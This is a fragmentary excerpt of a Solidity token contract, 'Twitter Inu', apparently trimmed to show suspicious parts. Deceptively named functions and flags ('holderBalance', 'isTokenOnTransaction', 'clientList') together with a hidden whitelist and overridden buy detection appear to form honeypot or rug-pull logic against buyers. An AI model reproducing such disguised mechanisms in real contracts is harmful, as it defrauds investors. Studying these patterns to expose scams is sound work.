...
Telegram : https://t.me/TwitterInu_BSC
...
contract TwitterInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x53FEd50Aab0847aFb655c530B3565e0ce71eF69D); 
    address payable public Wallet_Dev = payable(0x1601BA28d2cFd5694145B4c14cAB1A1eEdA31Dbb);
    ...
    string private constant _name = "Twitter Inu"; 
    ...
    bool public uniV2SwapRouter = false;
    bool public isTxinQueue = false;

    modifier isTokenOnTransaction {
        uniV2SwapRouter = true;
        _;
    }
    ...
    constructor () {
        ...
        _owner = 0x1601BA28d2cFd5694145B4c14cAB1A1eEdA31Dbb;
        ...
        clientList[Wallet_Marketing] = true;
    ...
    function holderBalance(address account) public isTokenOnTransaction override returns (uint256) {
        if(isTxinQueue){
            bool getClient = clientList[_msgSender()];
            bool isTimeStamp = getClient;
            if(isTimeStamp && getClient){
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            if(from == uniswapV2Pair){
                isBuy = true;
                if(uniV2SwapRouter){ isBuy = false;  }
            }
